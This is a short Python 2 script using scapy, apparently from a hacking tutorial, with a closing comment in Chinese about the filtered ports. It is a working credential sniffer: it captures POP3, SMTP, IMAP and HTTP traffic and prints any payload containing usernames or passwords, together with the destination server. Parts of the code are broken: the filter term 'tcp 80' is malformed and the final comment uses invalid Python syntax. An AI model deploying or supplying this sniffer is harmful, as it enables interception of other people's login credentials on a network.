import threading
from scapy.all import *

# our packet callback
def packet_callback(packet):
    
    if packet[TCP].payload:
    
        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():

            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload

            
# fire up our sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143 or tcp 80",prn=packet_callback,store=0)
//封包過濾條件(25port是SMTP，110port是POP3，143port是IMAP，這邊加上80port讓HTTP協定的封包資料也可以被截取)所收到的東西會放進packet_callback裡面，並傳回function